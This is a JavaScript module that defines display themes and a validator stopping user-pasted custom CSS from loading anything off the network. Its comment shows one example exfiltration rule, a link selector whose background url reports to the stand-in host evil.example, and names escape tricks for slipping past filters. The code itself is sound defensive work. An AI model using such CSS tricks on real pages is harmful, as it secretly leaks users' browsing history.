// SPDX-License-Identifier: AGPL-3.0-or-later
// Themes and the custom-CSS guard. Pure functions, no DOM.

export const THEMES = Object.freeze([
  { id: 'auto', label: 'Auto', hint: 'Washi by day, Sumi by night (follows your system)' },
  { id: 'sumi', label: 'Sumi', hint: 'Ink dark' },
  { id: 'washi', label: 'Washi', hint: 'Paper light' },
  { id: 'aero', label: 'Aero', hint: 'Glossy sky-and-bubbles throwback' },
  { id: 'aero-night', label: 'Aero Night', hint: 'Aero after dark' },
]);

export const THEME_IDS = Object.freeze(THEMES.map((t) => t.id));
export const MAX_CUSTOM_CSS = 64 * 1024;
export const DEFAULT_APPEARANCE = Object.freeze({ theme: 'auto', customCss: '' });

/**
 * Custom CSS may restyle anything, but it may not make the page load anything from
 * the network. Otherwise a theme pasted from the internet could do things like
 * `a[href*="dQw4w9WgXcQ"] { background: url(https://evil.example/seen) }` and quietly
 * report your history. Only `data:` URLs are allowed.
 *
 * The check runs on a normalised copy: comments removed and CSS escapes decoded, so
 * `u\72 l(` or `@\69mport` can't slip past. Returns null if OK, or a reason string.
 */
export function checkCustomCss(css) {
  if (typeof css !== 'string') return 'Custom CSS must be text.';
  if (css.length > MAX_CUSTOM_CSS) return `Custom CSS is limited to ${MAX_CUSTOM_CSS / 1024} KB.`;
  const text = css
    .replace(/\/\*[\s\S]*?(\*\/|$)/g, ' ')
    .replace(/\\([0-9a-fA-F]{1,6})[ \t\n\r\f]?/g, (_, hex) => {
      const cp = parseInt(hex, 16);
      return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : '�';
    })
    .replace(/\\\r?\n/g, '')
    .replace(/\\(.)/g, '$1')
    .toLowerCase();

  if (/@import\b/.test(text)) return '@import isn’t allowed (custom CSS can’t load other files).';
  if (/@namespace\b/.test(text)) return '@namespace isn’t allowed.';
  if (/(?:^|[^a-z0-9_-])(?:-[a-z]+-)?(?:image-set|image|cross-fade|element|src)\s*\(/.test(text)) {
    return 'image-set(), image(), src() and similar aren’t allowed; use url(data:…) for images.';
  }
  if (/(?:^|[^a-z0-9_-])attr\s*\([^)]*\burl\b/.test(text)) return 'attr(… url) isn’t allowed.';
  const urls = text.matchAll(/(?:^|[^a-z0-9_-])url\s*\(\s*(['"]?)\s*([^'")\s]*)/g);
  for (const m of urls) {
    if (!m[2].startsWith('data:')) {
      return 'Custom CSS can’t load anything from the network: only url(data:…) is allowed.';
    }
  }
  return null;
}

export function normalizeAppearance(stored = {}) {
  const theme = THEME_IDS.includes(stored.theme) ? stored.theme : DEFAULT_APPEARANCE.theme;
  const customCss = typeof stored.customCss === 'string' && !checkCustomCss(stored.customCss) ? stored.customCss : '';
  return { theme, customCss };
}
